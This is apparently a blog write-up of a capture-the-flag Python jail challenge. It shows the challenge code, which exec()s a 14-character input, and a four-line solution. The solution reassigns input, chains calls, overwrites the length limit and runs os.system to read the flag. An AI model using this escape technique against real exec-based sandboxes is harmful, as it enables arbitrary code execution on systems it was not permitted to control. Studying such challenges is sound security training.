---
staticPath: jailctf
Title: JailCtf
Description: How to escape a python jail with only 14 characters
Date: 2024-09-16
tags:
  - CTF
---
# The problem code was

```python
#!/usr/local/bin/python3
M = 14  
def f(code):
    assert len(code) <= M
    assert all(ord(c) < 128 for c in code)
    assert all(q not in code for q in ["exec", 
"eval", "breakpoint", "help", "license", "exit"
, "quit"])
    exec(code, globals())
f(input("> "))
```

# Solution
```
g=input;f(g())
f(g());f(g())
M=999999
import os; os.system("cat flag.txt")
```

# Solution Explanation
The problem was black box in nature so it took some experimentation to figure out what was going on. I was limited to 14 characters in input. By assigning the input function to g I can then call input using less characters.

On the next line I just call f twice. This allows me to do whatever I want on the next line because I have another whole line.

On the next line I modify the character limit to a high number so that I can run our payload on the final line.

On the final line I can run arbitrary python code to read the flag.